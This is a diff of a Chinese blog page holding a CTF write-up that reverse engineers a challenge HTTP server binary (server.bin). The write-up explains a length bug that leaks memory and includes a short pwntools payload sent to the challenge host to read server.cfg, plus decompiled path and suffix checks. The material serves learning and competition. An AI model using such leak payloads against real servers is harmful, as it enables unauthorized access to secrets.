@@ -22,14 +22,14 @@
 <meta property="og:url" content="http://0x48.pw/2016/06/27/0x1D/index.html">
 <meta property="og:site_name" content="Hc1m1">
 <meta property="og:description" content="三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/baimao2.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/baimao3.png">
-<meta property="og:image" content="http://qn.lazysheep.cc/img/baimao1.png">
-<meta property="og:updated_time" content="2018-02-06T07:10:52.450Z">
+<meta property="og:image" content="http://0x48.pw/img/baimao2.png">
+<meta property="og:image" content="http://0x48.pw/img/baimao3.png">
+<meta property="og:image" content="http://0x48.pw/img/baimao1.png">
+<meta property="og:updated_time" content="2018-02-09T04:19:04.992Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="寻找来自星星的你第二期Writeup">
 <meta name="twitter:description" content="三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…">
-<meta name="twitter:image" content="http://qn.lazysheep.cc/img/baimao2.png">
+<meta name="twitter:image" content="http://0x48.pw/img/baimao2.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -345,8 +345,8 @@
           
         <p>三个白帽之寻找来自星星的你第二期WP，这期的题目我觉得应该放在Linux逆向分类中…</p>
 <a id="more"></a>
-<p>IDA静态+GDB动态可以降低本地难度，通过IDA发现还需要有一个<code>server.cfg</code>文件，被读入了32bytes，路径在<code>server.bin</code>的上一层，创建完<code>server.cfg</code>文件后，随便输入32个<code>A</code>，然后允许该脚本：<code>$ ./server.bin 8888 ./</code>, 该进程将会在后台运行，使用<code>$ nc 127.0.0.1 8888</code>，后通过<code>$ ps aux|grep server.bin</code>查看子进程号(将会有两个server.bin进程，一个是主进程一个子进程，注意区分), 然后使用<code>$ gdb a 进程号</code> attach进程进行动态调试<br><img src="//qn.lazysheep.cc/img/baimao2.png" alt="baimao2"></p>
-<p><img src="//qn.lazysheep.cc/img/baimao3.png" alt="baimao3"></p>
+<p>IDA静态+GDB动态可以降低本地难度，通过IDA发现还需要有一个<code>server.cfg</code>文件，被读入了32bytes，路径在<code>server.bin</code>的上一层，创建完<code>server.cfg</code>文件后，随便输入32个<code>A</code>，然后允许该脚本：<code>$ ./server.bin 8888 ./</code>, 该进程将会在后台运行，使用<code>$ nc 127.0.0.1 8888</code>，后通过<code>$ ps aux|grep server.bin</code>查看子进程号(将会有两个server.bin进程，一个是主进程一个子进程，注意区分), 然后使用<code>$ gdb a 进程号</code> attach进程进行动态调试<br><img src="/img/baimao2.png" alt="baimao2"></p>
+<p><img src="/img/baimao3.png" alt="baimao3"></p>
 <p>不过使用nc不能输入非可显字符，所以建议用pwntools.</p>
 <p>本题的入口在<code>sub_401B08</code>函数，不过对解本题没啥帮助，所以可以跳到子进程的入口点<code>sub_4014D3</code>, 所以我们应该从该函数看起.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if ( !strncasecmp(::s1, &quot;GET /server.bin&quot;, 0xFuLL) )</div><div class="line">&#123;</div><div class="line">	file = &quot;/server.bin&quot;;</div><div class="line">	v11 = (__int64)&quot;image/bin&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -363,7 +363,7 @@
 <p>问题就出在这了，v4的值为<code>len(tmp)</code>而不是<code>len(s)</code>.<br>这里的v3是可控的，所以我们可以通过控制v3来控制v4的值，然后通过<code>result = write(fd, &amp;s, v4);</code><br>泄露内存，做到这，第一步的思路已经很明了了，就是通过内存泄露来获取s2的值</p>
 <p>通过本地调试，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x7ffe453 2ffb0 //s的地址</div><div class="line"></div><div class="line">0x7ffe453 30210 //s2的地址</div></pre></td></tr></table></figure></p>
 <p>接下来就简单了，直接贴payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">#-*- coding:utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level=&apos;debug&apos;</div><div class="line">r = remote(&apos;123.59.56.23&apos;, 43481)</div><div class="line">payload = &apos;GET /tmp/a\nHTTP/1.0&apos; + &apos;g&apos;*(608+3) + &apos;Cookie: auth=x\n&apos;</div><div class="line">r.send(payload)</div><div class="line">while True:</div><div class="line">	r.recv()</div></pre></td></tr></table></figure></p>
-<p><img src="//qn.lazysheep.cc/img/baimao1.png" alt="baimao"><br>得到<code>../server.cfg</code>中32bytes的内容.</p>
+<p><img src="/img/baimao1.png" alt="baimao"><br>得到<code>../server.cfg</code>中32bytes的内容.</p>
 <p>接下来就是分析<code>sub_400F12</code>函数，发现是一个base64decode函数，那就简单了，把这32bytes内容进行base64编码后加入cookie中. </p>
 <p>进入下一步，继续代码<br>代码贴出来分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">....</div><div class="line">	for ( i = 0LL; i &lt; (signed __int64)n; ++i )</div><div class="line">	&#123;</div><div class="line">		if ( *(_BYTE *)(i + 0x605240) == 0xD || *(_BYTE *)(i + 0x605240) == 0xA )</div><div class="line">		*(_BYTE *)(i + 0x605240) = 0;</div><div class="line">	&#125;</div><div class="line">	// \n和\r都会转换成\0</div><div class="line">....</div><div class="line">	file = (char *)&amp;unk_605244;</div><div class="line">	v8 = strlen((const char *)&amp;unk_605244);</div><div class="line">	v15 = 0LL;</div><div class="line">	while ( v8 &gt; v15 &amp;&amp; isspace(file[v15]) )</div><div class="line">	&#123;</div><div class="line">		++v15;</div><div class="line">		++file;</div><div class="line">	&#125; // 去除开头的空格</div><div class="line">	for ( j = 0LL; ; ++j )</div><div class="line">	&#123;</div><div class="line">		if ( strlen(file) &lt;= j )</div><div class="line">			goto LABEL_38;</div><div class="line">		if ( isspace(file[j]) )</div><div class="line">			break;</div><div class="line">	&#125;</div><div class="line">	file[j] = 0; //把遇到的第一个空格转换成\0</div><div class="line">LABEL_38:</div><div class="line">	v9 = strlen(file);</div><div class="line">	for ( k = 0; k &lt; v9; ++k )</div><div class="line">	&#123;</div><div class="line">		if ( file[k] == 0x2E &amp;&amp; file[k + 1] == 0x2E )</div><div class="line">			sub_40133B(2, 4203054LL, (__int64)file, a1); </div><div class="line">	&#125; // file中不能存在连续的0x2E(.)字符</div><div class="line">	v11 = 0LL;</div><div class="line">	for ( l = 0LL; ; ++l )</div><div class="line">	&#123;</div><div class="line">		if ( !off_603160[2 * l] )</div><div class="line">			goto LABEL_49;</div><div class="line">		v3 = (signed int)strlen(off_603160[2 * l]);</div><div class="line">		v4 = off_603160[2 * l];</div><div class="line">		v5 = strlen(file);</div><div class="line">		if ( !strncmp(&amp;file[v5 - v3], v4, v3) )</div><div class="line">			break;</div><div class="line">	&#125;</div><div class="line">	v11 = (__int64)off_603160[2 * l + 1]; //后缀判断</div><div class="line">LABEL_49:</div><div class="line">	if ( !v11 )</div><div class="line">		sub_40133B(2, 4203080LL, 4202720LL, a1);</div><div class="line">&#125;</div><div class="line">filea = (__int64)(file + 1);</div><div class="line">v10 = open((const char *)filea, 0, s2);</div></pre></td></tr></table></figure></p>
 <p>后缀判断:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0x401f20:	&quot;gif&quot;</div><div class="line">0x401f24:	&quot;image/gif&quot;</div><div class="line">0x401f2e:	&quot;jpg&quot;</div><div class="line">0x401f32:	&quot;image/jpeg&quot;</div><div class="line">0x401f3d:	&quot;png&quot;</div><div class="line">0x401f41:	&quot;image/png&quot;</div><div class="line">0x401f4b:	&quot;htm&quot;</div><div class="line">0x401f4f:	&quot;text/html&quot;</div><div class="line">0x401f59:	&quot;xml&quot;</div><div class="line">0x401f5d:	&quot;text/xml&quot;</div><div class="line">0x401f66:	&quot;tz&quot;</div><div class="line">0x401f69:	&quot;image/gz&quot;</div><div class="line">0x401f72:	&quot;js&quot;</div><div class="line">0x401f75:	&quot;text/js&quot;</div><div class="line">0x401f7d:	&quot;css&quot;</div><div class="line">0x401f81:	&quot;text/css&quot;</div><div class="line">// 允许的后缀有8个: git, jpg, png, htm, xml, tz, js, css</div></pre></td></tr></table></figure></p>
@@ -387,7 +387,7 @@
         <p><span>本文标题:</span><a href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2016-06-27, 20:11:37</p>
-        <p><span>最后更新:</span>2018-02-06, 15:10:52</p>
+        <p><span>最后更新:</span>2018-02-09, 12:19:04</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/06/27/0x1D/" title="寻找来自星星的你第二期Writeup">http://0x48.pw/2016/06/27/0x1D/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/06/27/0x1D/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -432,8 +432,8 @@
         .left-col .switch-area {
             display: none;
         }
-        .toc-level-3 i,
-        .toc-level-3 ol {
+        .toc-level-6 i,
+        .toc-level-6 ol {
             display: none !important;
         }
     </style>
@@ -483,7 +483,7 @@
         <div id="footer-info">
             <div class="footer-left">
                 <i class="fa fa-copyright"></i> 
-                2016-2018 Hcamael
+                2015-2018 Hcamael
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
@@ -542,6 +542,23 @@
         }
     
 </script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
 
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
